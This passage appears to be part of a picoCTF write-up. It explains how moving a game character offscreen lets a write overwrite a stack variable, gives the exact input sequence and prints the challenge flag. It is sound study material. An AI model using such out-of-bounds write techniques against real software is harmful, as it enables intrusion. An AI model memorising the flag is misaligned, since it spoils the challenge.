The second line we give it some value.

What if we could point result at `v6`? We can.

Because it is placed right above the variable `v7` in main, and that same variable is `a3` in this very equation, we can try to put a value inside the memory location:

```
v7 - offset = v6
```

We can do that by manipulating `*a1` and `a1[1]` because they are the variables we can change using `wasd`.

By manipulating such that `*a1 = -1` and `a1[1] = 86`

the equation will point to:

```
v7 - offset = v3 - 90*(-1) + 86 = v7 - 4
```

And if we put any value inside this location with the `l` option we will change the value of `v6`.

The input we will provide will be:

```
aaaaaaaawwww
l f
p
```

The first line places us at the coordinates (86, -1) and that's offscreen even.

*Note:* the value for `a[1]` which is controlled with `a` and `d` wraps around so if we are at 0,4 and press `a` we will end up at 3,89

Then when we assign this place in the memory the value of `f` (random non zero).

Then we "win" with `p`.

*Note:* we don't get the win message inside the `solve_round` because we don't meet its conditions to print "you win" because of our manipulation of the players position we did.

after all said and done, we exit the loops inside main and get the flag.

*The most confusing note:* why the hell is `v7 - 4` the address of `v6` and not `v7 - 1`?

I thought for the longest time that it must be `v7 - 1` because `v6` is a `char` varible, that takes one byte of memory and is off by one byte from `v7`.

My theory is that `IDA` did not decompile the type of `v6` correctly and its actually an `int` that takes 4 bytes, every attempt I had with `v7 - 1` to `v7 - 3` resulted in something unexpected. If my theory is correct it the value we assigned did bad things to `v7` itself.

In other decompilers I tried, it **IS** an int value.

*Conclusion:* this was a very hard challenge for me, definatly not 100 points as I see it.

> picoCTF{gamer_m0d3_enabled_3aa88304}

___
___
